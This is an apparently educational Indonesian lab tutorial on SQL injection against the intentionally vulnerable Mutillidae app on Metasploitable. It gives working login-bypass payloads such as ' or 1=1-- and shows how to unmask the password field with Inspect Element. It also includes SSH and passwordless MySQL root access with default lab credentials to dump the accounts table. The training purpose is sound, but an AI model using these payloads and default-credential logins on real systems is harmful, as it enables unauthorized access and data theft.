Lesson 5
--------
### Section 8: SQL Injection: Single Quote Test On Username Field
- **Step 1**    : Buka Login/Register
    ![](/assets/lesson-5/login-register.png)
- **Step 2**    : Ketik `'` di kolom **Name**    
- **Step 3**    : Klik Login
    ![](/assets/lesson-5/quote_test.png)
- **Step 4**    : Anda akan mendapatkan error, jika terjadi error setelah anda login dengan **Name** `'`, berarti backend dari sistem rentan terhadap SQL Injection
    ![](/assets/lesson-5/quote_test_error.png)
        - Query yang dihasilkan:
        ```
        SELECT * FROM accounts WHERE username=''' AND password=''
        ```
    - Query Normal:
        ```
        SELECT * FROM accounts WHERE username='admin' AND password='adminpass'
        ```
    
### Section 9: SQL Injection: By-Pass Password Without Username (Obtain Access #1)
- **Step 1**    : Buka Login/Register
- **Step 2**    : Ketik `' or 1=1-- ` di kolom **Name** dengan spasi di akhir `-- `
- **Step 3**    : Klik Login
    ![](/assets/lesson-5/login2.png)
- **Step 4**    : Anda akan berhasil login dengan akun Admin karena Admin berada pada urutan paling atas pada database. Dengan kondisi `1=1` maka akan menghasilkan kondisi yang selalu benar dan `-- ` berguna untuk comment pada SQL, karena itu query selanjutnya akan dibatalkan **(AND password='')**.
    ![](/assets/lesson-5/login2_berhasil.png)
    - Query yang dihasilkan:
        ```
        SELECT * FROM accounts WHERE username='' or 1=1-- ' AND password=''
        ```
    - Query yang sebenarnya dikerjakan:
        ```
        SELECT * FROM accounts WHERE username='' or 1=1
        ```
    
### Section 9: SQL Injection: Single Quote Test On Password Field
- **Step 1**    : Buka Login/Register.
- **Step 2**    : Ketik `samurai` di kolom **Name**.
- **Step 3**    : Klik Kanan di kolom **Password**.
- **Step 4**    : Klik **Inspect Element**.
    ![](/assets/lesson-5/inspect-element-password.png)
- **Step 5**    : Ganti `password` dengan kata `text` pada element **type**.
    ![](/assets/lesson-5/inspect-password-to-text.png)
- **Step 6**    : Ketik `'` di kolom **Password**.
- **Step 7**    : Klik Login. Perhatikan kolom password sudah tidak lagi tersensor dengan bintang karena **type** sudah diganti menjadi `text`.
    ![](/assets/lesson-5/inspect-password-not-obfuscated.png)
    - Anda akan mendapatkan error
        ![](/assets/lesson-5/password-login-error.png)
    - Query di backend menjadi error, mengindikasikan bahwa backend dari sistem rentan terhadap SQL Injection.
    - Query yang dihasilkan:
        ```
        SELECT * FROM accounts WHERE username='samurai' and password='''
        ```
    - Query Normal:
        ```
        SELECT * FROM accounts WHERE username='samurai' AND password='samurai'
        ```
        
### Section 10: SQL Injection: Single Quote Test On Password Field (Obtain Access #2)
- **Step 1**    : Buka Login/Register.
- **Step 2**    : Ketik `samurai` di kolom **Name**.
- **Step 3**    : Klik Kanan di kolom **Password**.
- **Step 4**    : Klik **Inspect Element**.
    ![](/assets/lesson-5/inspect-element-password.png)
- **Step 5**    : Ganti `password` dengan kata `text` pada element **type**.
    ![](/assets/lesson-5/inspect-password-to-text.png)
- **Step 6**    : Ketik `' or 1=1-- ` di kolom **Password**. Jangan lupa memberikan spasi setelah `-- `
- **Step 7**    : Klik Login. Perhatikan kolom password sudah tidak lagi tersensor dengan bintang karena **type** sudah diganti menjadi `text`.
    ![]/assets/lesson-5/non-obfused-pass-1.png)
    - Anda akan tetap terlogin sebagai admin bukan samurai, Karena Admin berada pada urutan atas dari hasil query. Hal ini disebabkan oleh desain dari program Multilidae.
        ![](/assets/lesson-5/password-login-admin.png)
- **Step 8**    : Logout

### Section 11: Single Quote Test On Password Field (Obtain Access #3)
- **Step 1**    : Buka Login/Register.
- **Step 2**    : Ketik `samurai` di kolom **Name**.
- **Step 3**    : Klik Kanan di kolom **Password**.
- **Step 4**    : Klik **Inspect Element**.
    ![](/assets/lesson-5/inspect-element-password.png)
- **Step 5**    : Ganti `password` dengan kata `text` pada elemen **type**. Ganti elemen maxlength menjadi `50` dan elemen size menjadi `50`
    ![](/assets/lesson-5/inspect-password-size.png)
- **Step 6**    : Ketik `' or (1=1 and username='samurai')-- ` di kolom **Password**. Jangan lupa memberikan spasi setelah `-- `
- **Step 7**    : Klik Login. Perhatikan kolom password sudah tidak lagi tersensor dengan bintang karena **type** sudah diganti menjadi `text`.
    ![](/assets/lesson-5/non-obfused-pass-2.png)
    - Anda akan berhasil login sebagai `samurai`
        ![](/assets/lesson-5/samurai-logged-in.png)
    - Query yang dihasilkan
        ```
        SELECT * FROM accounts WHERE username='samurai' AND password='' or (1=1 and username='samurai')-- '
        ```

### Database Practice
- **Step 1**    : SSH Metasploitable dengan username `msfadmin` dan password `msfadmin`.
    ```
    ssh msfadmin@10.151.36.64
    ```
- **Step 2**    : Login MySQL dengan user `root` tanpa password
    ```
    mysql -u root
    ```
- **Step 3**    : Pilih database `owasp10`
    ![](/assets/lesson-5/db.png)
- **Step 4**    : Lihat daftar tabel dalam database
    ```
    show tables;
    ```
- **Step 5**    : Lihat isi semua kolom dari tabel `accounts`
    ```
    desc accounts;
    ```
    ![](/assets/lesson-5/db_table.png)
- **Step 6**    : Lihat semua data dari tabel `accounts`
    ```
    select * from accounts;
    ```
     ![](/assets/lesson-5/db_table_records.png)
- **Step 7**    : Contoh SQL Injection
    - `select * from accounts where username = ''  and password = '';`
    - `select * from accounts where username = 'samurai'  and password = 'samurai';`
    - `select * from accounts where username = 'samurai'  and password = 'wrongpassword';`
    - `select * from accounts where username = 'samurai';-- and password = 'wrongpassword';`
    ![](/assets/lesson-5/db_query.png)
- **Step 8**    : Mencoba hasil dari Single Quote(')
    - `select * from accounts where username = '''  and password = '';`, dari **section 8, step 2**.
    - `';`, dari section 8, step 2.
    - `select * from accounts where username = '' or 1=1; --   and password = '';`, dari **section 9, step 2**.
    - `select * from accounts where username = 'samurai' and password = '' or 1=1; -- ';`, dari **section 10, step 6**.
    ![](/assets/lesson-5/db_query_1.png)
    - `select * from accounts where username = 'samurai' and password = '' or (1=1 and username = 'samurai'); -- ';`, dari **section 11, step 6**.
    ![](/assets/lesson-5/db_query_2.png)

### Proof of Lab
![](/assets/lesson-5/proof_of_lab.png)
    






    
